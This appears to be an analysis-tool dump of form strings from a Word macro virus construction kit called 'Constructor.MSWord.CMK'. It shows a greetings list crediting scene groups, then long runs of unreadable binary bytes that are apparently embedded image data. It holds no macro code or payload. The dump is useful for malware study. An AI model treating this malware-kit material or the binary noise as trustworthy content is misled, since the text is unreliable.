VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Blackjack�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Silvier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�LineZer0 Network & Metaphaseg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�All ppl on UNDERNET
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�...and of course to all people I forgot...sorry ; )
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PhreakX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"!&+7/&)4)!"0A149;>>>%.DIC<H7=>;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;("(;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��$3br�	

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B����	#3R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$4�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� p+KL�[�UA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m��<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��]��#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��W����QX�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e\�>�SX�E��m�U�K��wyN�,u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�q\�Vy,�|���e��M&��t�C�����V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���
���6[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v8
;��ggq*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���P�Ne�#5Aϖv��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9����Xld���� ��Ӧ��D���
�v��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{[W��>�ɠRk��t�4�V�o��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�7�1�k�Q[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
){F��>H�ۭ�!��9&�6V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W-4g|�Fm�p+�ԂG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hՓ)Gm,��Ci�u"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V���{��w�wE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pH���.<#���e��ȿ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(5�g�<M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
2k��.��:�ֱH%Tl+�q\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޭ�UIy�J�+�؏�2SR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�խȨ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�?v��{ԍқ�TբD��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qH��k��r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��ۖ�����N)���EMhL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E$�"��F�+_D�D`C`���V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�A�i�J���t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݩ�Hiew_@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� ��Qmr+���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r;ݴu�+F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o#,ks��$�@�Ⳏ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�۪�$EA1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#�k�Kz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�X/5OU�)K���vct�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K˙�BdyUNZE�Wӭ�1s�\�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>¹�5�'N�H��A����[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h �2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^����=��]ξkM7Z�e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�v��Ŧ��ͨ�Mnb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aҳ��@�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�>b1�dM��a��DT%ą�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CU̞�!BJ��Aa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����֯
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��qߥki���E��ͥ����P`�e_���*�Ķ��md����w�N7qҪK�co
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[,p,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rG�	��(^�zz����q�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
אh��кmu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Y.$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�W�.��	��h��g��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[Qt�_���g�%'�0厑k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{wom;$�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N?Zƻ�kܛkfa�Ȯ�L�}��#s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
**�¹�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i4��9���#Pa��I��w3]�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��JM�޼0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>���*�_	�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�]�!-k 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Sv^��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��19P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k�����Y��s*|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=EoF���ˉ�*Q\�f��F��*6R�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���y�яl7JgJU�Ԭ��2^���N���x�C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yj�m9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UM�0���vj�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'��ZT�U�]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!;eS�IA(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��D���~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�//Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�GZ���w�u5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�W<4b��q�ο��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�|+w�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�����})��Io�G�� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m"��Įe�N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b��V/7�aVK{Q�Ƈ�����Si����5&�˻�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�C�cD�4�Y�2���PG�Z��-6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y��X�IEida���-��ח)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|:4Kqr�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��*��?�V�V�<�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����X��À+���o݉����.ynD�
�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B~Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƽ����qќ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8o��k�oSܧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3.d��v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�+S���V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���	ZnI5��Mkmj��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B��\͍��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Kà?ʽ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>�<�eUN�n�c�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��9a{�'� dV\��V�$ӯ����g�)��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����6�[�cQ�l�Ϲ�]��U��<[�!ڬ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֝*qM�kw#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zr�|�߷Cƞ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�I<?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9&M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pq�p����ԝ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
